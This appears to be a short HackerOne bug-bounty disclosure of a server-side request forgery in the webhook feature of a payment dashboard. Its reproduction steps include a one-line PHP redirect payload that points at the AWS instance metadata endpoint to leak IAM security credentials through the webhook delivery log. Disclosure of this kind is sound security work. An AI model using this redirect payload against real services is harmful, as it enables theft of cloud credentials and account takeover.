## SSRF in webhooks leads to AWS private keys disclosure
https://hackerone.com/reports/508459
Steps to reproduce
1. Host the following payload on https://<your-attacker-server>/redir.php
   ```
   <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
   ```
2. Point your webhook endpoint on https://dashboard.omise.co/test/webhooks/edit to https://<your-attacker-server>/redir.php
3. Make a random call to the API, e.g. adding a user;
4. View the "Recent Deliveries" of the webhook calls on https://dashboard.omise.co/test/webhooks
5. Note the 200 OK status code indicating a successful redirect
6. Click the event to view the response body of the AWS metadata

